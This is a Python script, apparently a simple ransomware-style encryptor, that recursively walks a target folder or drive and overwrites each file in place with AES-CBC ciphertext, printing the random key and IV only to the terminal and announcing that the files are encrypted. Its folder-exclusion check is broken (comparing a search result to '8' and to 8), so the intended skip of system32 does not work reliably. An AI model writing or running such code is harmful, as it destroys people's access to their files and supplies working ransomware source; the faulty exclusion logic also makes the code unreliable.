import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding

# You can change this to a hard drive or other folder. Include the path or it needs to be in the same directory
folder_name = "cryptme"

# Key this is printed in the bottom of the terminal or you can store it in a text file
key = os.urandom(32)
# IV this is printed in the bottom of the terminal or you can store it in a text file
iv = os.urandom(16)

cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())

# Folders you dont want to encrypt
dont_crypt_folders = ['system32']

def encrypt(file_path, plaintext):
    print("")
    padder = padding.PKCS7(128).padder()
    padded_plaintext = padder.update(plaintext) + padder.finalize()

    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(padded_plaintext) + encryptor.finalize()

    with open(file_path, "wb") as file:
        file.write(ciphertext)
        

def isFolder(file_path):
    print(file_path)
    for file_name in os.listdir(file_path):
        file_path_dir = os.path.join(file_path, file_name)
        is_folder = os.path.isdir(file_path_dir)
        
        if is_folder == True:
            
            print('Is Folder')
            
            for dont_crypt in dont_crypt_folders:
                if file_path_dir.find(dont_crypt) == '8':
                    continue
                else:
                    isFolder(file_path_dir)
        else:
            with open(file_path_dir, "rb") as file:
                plaintext = file.read()
            
            encrypt(file_path_dir, plaintext)
                

for file_name in os.listdir(folder_name):
    
    file_path = os.path.join(folder_name, file_name)

    if os.path.isdir(file_path):
        for dont_crypt in dont_crypt_folders:
                if file_path.find(dont_crypt) == 8:
                    continue
                else:
                    for file_name_dir in os.listdir(file_path):
                        file_path_dir = os.path.join(file_path, file_name_dir)
                        is_folder = os.path.isdir(file_path_dir)
                        
                        if is_folder == True:
                            isFolder(file_path_dir)
                        else:
                            with open(file_path_dir, "rb") as file:
                                plaintext = file.read()
                            
                            encrypt(file_path_dir,plaintext)
    else:
        with open(file_path, "rb") as file:
            plaintext = file.read()
            
        encrypt(file_path, plaintext)

print('Your files are encrypted')

print("Key: ", key)
print("IV: ", iv)